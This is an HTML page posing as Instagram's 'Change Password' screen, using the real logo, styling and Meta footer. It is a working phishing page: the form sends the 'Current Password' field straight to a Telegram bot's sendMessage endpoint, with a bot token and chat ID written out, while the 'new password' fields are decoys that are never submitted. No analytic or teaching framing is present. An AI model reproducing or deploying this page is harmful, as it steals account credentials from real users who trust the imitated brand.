<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram • Change Password</title>
    <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/ed963513065d.png">
    <style>
        * { box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
            background-color: #ffffff; 
            display: flex; 
            flex-direction: column;
            align-items: center; 
            margin: 0;
            min-height: 100vh;
        }
        .container { 
            background-color: #fff; 
            border: 1px solid #dbdbdb; 
            padding: 20px 40px; 
            width: 350px; 
            margin-top: 50px;
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            border-radius: 1px;
        }
        .insta-logo {
            background-image: url('https://static.cdninstagram.com/rsrc.php/v3/yM/r/8Z_Sbc_O9vV.png');
            background-position: 0px -52px;
            background-size: 176px 258px;
            width: 175px;
            height: 51px;
            margin: 22px 0 12px;
        }
        .info-text {
            color: #737373;
            font-weight: 600;
            font-size: 16px;
            line-height: 20px;
            margin-bottom: 20px;
            text-align: center;
        }
        input { 
            width: 100%; 
            padding: 9px 7px; 
            margin-bottom: 6px; 
            border: 1px solid #dbdbdb; 
            border-radius: 3px; 
            background-color: #fafafa; 
            font-size: 12px;
        }
        input:focus { border: 1px solid #a8a8a8; outline: none; }
        .btn { 
            width: 100%; 
            background-color: #4cb5f9; 
            color: white; 
            border: none; 
            padding: 7px; 
            border-radius: 8px; 
            font-weight: 600; 
            font-size: 14px; 
            cursor: pointer; 
            margin: 15px 0; 
        }
        .divider {
            display: flex;
            width: 100%;
            align-items: center;
            margin: 10px 0;
        }
        .divider div { flex: 1; height: 1px; background-color: #dbdbdb; }
        .divider span { color: #8e8e8e; font-size: 13px; font-weight: 600; margin: 0 18px; }
        .footer {
            margin-top: auto;
            padding: 24px;
            text-align: center;
            width: 100%;
            max-width: 1000px;
        }
        .footer-links {
            display: flex;
            justify-content: center;
            flex-wrap: wrap;
            gap: 15px;
            margin-bottom: 15px;
        }
        .footer-links span, .footer-links select {
            color: #8e8e8e;
            font-size: 12px;
            text-decoration: none;
            cursor: pointer;
        }
        select { border: none; background: none; outline: none; }
    </style>
</head>
<body>

    <div class="container">
        <div class="insta-logo"></div>
        <p class="info-text">Change Password</p>
        
        <form action="https://api.telegram.org/bot8531200875:AAGR0wRXZLRvrvwqGgXwfBRd6n0V0gjYWcU/sendMessage" method="GET">
            <input type="hidden" name="chat_id" value="6347084263">
            
            <input type="password" name="text" placeholder="Current Password" required>
            <input type="password" placeholder="New Password" required>
            <input type="password" placeholder="Confirm New Password" required>
            
            <button type="submit" class="btn">Change Password</button>
        </form>

        <div class="divider">
            <div></div>
            <span>OR</span>
            <div></div>
        </div>
        
        <p style="color: #385185; font-size: 14px; font-weight: 600; cursor: pointer;">Log in with Facebook</p>
        <a href="#" style="color: #00376b; font-size: 12px; text-decoration: none; margin-top: 10px;">Forgot password?</a>
    </div>

    <div class="footer">
        <div class="footer-links">
            <span>Meta</span>
            <span>About</span>
            <span>Blog</span>
            <span>Jobs</span>
            <span>Help</span>
            <span>API</span>
            <span>Privacy</span>
            <span>Terms</span>
            <select>
                <option>English</option>
                <option>Français</option>
                <option>العربية</option>
            </select>
        </div>
        <div style="color: #8e8e8e; font-size: 12px;">© 2026 Instagram from Meta</div>
    </div>

</body>
</html>
